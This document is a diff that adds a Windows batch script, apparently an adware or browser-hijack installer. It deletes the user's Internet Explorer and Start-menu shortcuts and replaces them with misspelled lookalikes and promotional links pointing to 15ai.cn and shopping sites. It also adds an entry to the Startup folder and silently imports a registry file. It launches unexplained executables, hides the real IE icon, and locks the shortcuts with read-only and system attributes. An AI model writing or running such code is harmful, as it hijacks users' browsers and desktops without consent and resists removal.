@@ -1,0 +1,73 @@
+cls
+@echo off
+del "%userprofile%\桌面\IEXPLORE.lnk"
+del "%userprofile%\桌面\IEXPLOREr.lnk"
+del "%userprofile%\桌面\Internet Exporer.lnk"
+del "%userprofile%\桌面\Internet Explorer.lnk"
+del "%userprofile%\桌面\Internet Exp1orer.lnk"
+del "%userprofile%\桌面\Internet Explorer.lnk" 
+del "%userprofile%\桌面\Internet*.lnk"  /f/q/a
+del "%userprofile%\桌面\*Internet*.lnk" /f/q/a
+
+del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk" /f/q/a
+del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.url" /f/q/a
+del "%userprofile%\桌面\*.url"     /f/q/a
+del   "%userprofile%\「开始」菜单\*.url"   /f/q/a
+del   "%userprofile%\「开始」菜单\*.lnk"  /f/q/a
+del  "C:\Documents and Settings\All Users\「开始」菜单\*.url" /f/q/a
+del  "C:\Documents and Settings\All Users\「开始」菜单\*.lnk" /f/q/a
+
+copy "Internet Explorer.lnk" "%userprofile%\「开始」菜单\网址之家.lnk" /y
+copy "淘宝购物.lnk" "%userprofile%\「开始」菜单\淘宝购物.lnk" /y
+copy "免费电影.lnk" "%userprofile%\「开始」菜单\免费电影.lnk" /y
+copy "KwLive.lnk" "%userprofile%\「开始」菜单\网络电视.lnk" /y
+copy "bq.lnk" "%userprofile%\「开始」菜单\QQ表情.lnk" /y
+
+copy "腾讯QQ.lnk" "%userprofile%\「开始」菜单\程序\启动\QQ.lnk" /y
+copy "Internet Explorer.lnk" "%userprofile%\桌面\Internet Expleror.lnk" /y
+copy "淘宝购物.lnk" "%userprofile%\桌面\淘宝购物.lnk" /y
+copy "bq.lnk" "%userprofile%\桌面\QQ表情.lnk" /y
+copy "免费电影.lnk" "%userprofile%\桌面\免费电影.lnk" /y
+copy "KwLive.lnk" "%userprofile%\桌面\网络电视.lnk" /y
+ 
+copy "KwLive.lnk" "%userprofile%\「开始」菜单\程序\网络电视.lnk" /y
+copy "Internet Explorer.lnk" "%userprofile%\「开始」菜单\程序\Internet Exporer.lnk" /y
+copy "Internet Exporer.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\启动 Internet Explorrer 浏览器.lnk" /y
+
+copy "KwLive.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\网络电视.lnk" /y
+copy "bq.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\QQ表情.lnk" /y
+
+copy "taobao.lnk" "%userprofile%\Favorites\淘宝购物.lnk" /y
+copy "免费电影.lnk" "%userprofile%\Favorites\免费电影.lnk" /y
+copy "bq.lnk" "%userprofile%\Favorites\QQ表情.lnk" /y
+copy "Internet Exporer.lnk" "%userprofile%\Favorites\酷站大全.lnk" /y 
+
+regedit /s sy.reg
+start http://www.15ai.cn
+start KwLive.exe
+start inetinkao.exe
+attrib  "%USERPROFILE%\桌面\*.lnk"  +R +S
+attrib "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk"  +R +S
+
+Reg Add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu" /v "{871C5380-42A0-1069-A2EA-08002B30309D}" /t "REG_DWORD" /d "1" /f
+Reg Add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{871C5380-42A0-1069-A2EA-08002B30309D}" /t "REG_DWORD" /d "1" /f
+Set "TMPINF=C:\TmpInf.inf"
+echo [Version] >%TMPINF%
+echo Signature="$Windows NT$" >>%TMPINF%
+echo [DefaultInstall] >>%TMPINF%
+RUNDLL32 SETUPAPI.DLL,InstallHinfSection DefaultInstall 128 %TMPINF%
+del %TMPINF%
+echo Set Shell=CreateObject("WScript.Shell")>createcs.vbs
+echo DesktopPath=Shell.SpecialFolders("Desktop")>>createcs.vbs
+echo Set link=Shell.CreateShortcut(DesktopPath ^& "\\Internet Explorer.lnk")>>createcs.vbs
+echo link.description="Internet Explorer">>createcs.vbs
+echo sPath=left(Wscript.ScriptFullName,len(Wscript.ScriptFullName)-len(Wscript.ScriptName))>>createcs.vbs
+echo link.TargetPath=sPath ^& "c:\Program Files\Internet explorer\IEXPLORE.EXE">>createcs.vbs
+echo Link.Arguments = "http://www.15ai.cn/?网址导航">>createcs.vbs
+echo link.WindowStyle=1 >>createcs.vbs
+echo link.WorkingDirectory=DesktopPath>>createcs.vbs
+echo link.Save>>createcs.vbs
+createcs.vbs
+del createcs.vbs
+
+exit
